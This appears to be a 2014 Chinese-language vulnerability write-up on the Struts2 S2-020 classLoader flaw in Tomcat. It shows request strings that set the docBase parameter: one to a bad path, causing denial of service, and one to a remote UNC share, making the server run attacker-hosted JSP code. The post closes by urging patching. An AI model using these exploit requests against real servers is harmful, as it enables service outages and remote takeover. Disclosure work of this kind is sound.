# Struts2 Tomcat class.classLoader.resources.dirContext.docBase赋值造成的DoS及远程代码执行利用!


0x00 背景
-------

* * *

最近大家都在玩Struts2的class.classLoader.官方在S-20的两漏洞,一个commons-fileupload造成的DoS,这个就是让cpu慢点,不打补丁觉得也无所谓.另外一个,就是class.classLoader允许对象赋值.

看到大家总是在tomcat8上寻求利用,觉得很鸡肋(用户的应用更换Tomcat真没那么快),版本限制就是软肋.顿时,哥娇躯一震,发个无版本限制的利用,让大家提提神!

直接进主题,是可以对Tomcat的docBase属性直接赋值,`class.classLoader.resources.dirContext.docBase=x`

docBase这个参数,是Tomcat进行应用目录映射路径配置的,如果赋值的地址不存在会发生什么?

0x01 细节
-------

* * *

### 利用1:造成DoS(应用映射路径不存在,导致应用404)

如图:

![2014040410310192682.png](http://drops.javaweb.org/uploads/images/32548f88da92af8ea1fb571afd0ec634e5aa7993.jpg)

给当前应用目录,赋个不存在的地址:

```
?class.classLoader.resources.dirContext.docBase=不存在路径 

```

图:

![2014040410324488403.png](http://drops.javaweb.org/uploads/images/34da4f14dc3f2777e34ad780977b63345a552322.jpg)

![2014040410344310185.png](http://drops.javaweb.org/uploads/images/8f0ae06df65724b0eb57adbeaf504b4b4b77374f.jpg)

这样当前应用,以后不管访问哪个地址都是404了(因为映射的目录不存在),造成DoS效果!

### 利用2:远程代码执行

还是这个参数,既然可以指向任意地址,如果指向的地址映射目录,是攻击者可控的目录,那就是远程代码执行了.

docBase参数有三种地址路径部署方式:

```
1.相对路径:以Tomcat的webapps目录为更目录
2.绝对路径:如,c://web/部署的应用目录

```

但,还有一种地址配置方式,大家可能不会常用,那就是UNC path(tomcat是支持远程网络路径方式的):

```
3.UNC path(如,远程共享一个标准的J2EE应用目录) 

```

具体看这里：[http://wiki.apache.org/tomcat/FAQ/Windows#Q6](http://wiki.apache.org/tomcat/FAQ/Windows#Q6)

这里我内网其他主机共享一个标准的J2EE应用目录，如图:

![2014040410480871738.png](http://drops.javaweb.org/uploads/images/3020d98c1799832f1921095b31c403296d1c0cb7.jpg)

![2014040410482029796.png](http://drops.javaweb.org/uploads/images/abb62a3b97a74cae7725fa389a274cfb1292a8f6.jpg)

本机访问共享：

```
//192.168.x.x/test

```

![2014040410514763954.png](http://drops.javaweb.org/uploads/images/e295a12cd8dc73f1fc3c1d6a6b2650f17b885f68.jpg)

```
http://127.0.0.1/s/example/HelloWorld.action?class.classLoader.resources.dirContext.docBase=//192.168.x.x/test 

```

这时应用的映射目录就是共享服务器的目录了,如图：

![2014040410582890074.png](http://drops.javaweb.org/uploads/images/8cc87fb82e38904794bc5a8731dfeeb8030ecfac.jpg)

**注意这里，web容器是当前服务器的，但运行的代码是共享服务器的test目录,java代码是在当前服务器编译及运行的（这里不要混淆了！！！）**

test.jsp的内容是，执行代码调用系统计算器的命令

![2014040411021566871.png](http://drops.javaweb.org/uploads/images/0fd35361cb5528b6a72780d8175f77728e35ec5d.jpg)

那如果在公网上部署一个共享目录（无任何权限限制），那就是远程代码执行了。

当然，公网上部署一个共享目录也有网络限制，可能运营商限制了共享协议，被攻击服务器的操作系统是否支持UNC path等等，这里只是思路。主要是分享一下！

//用户还是老实打补丁,不要心存幻想!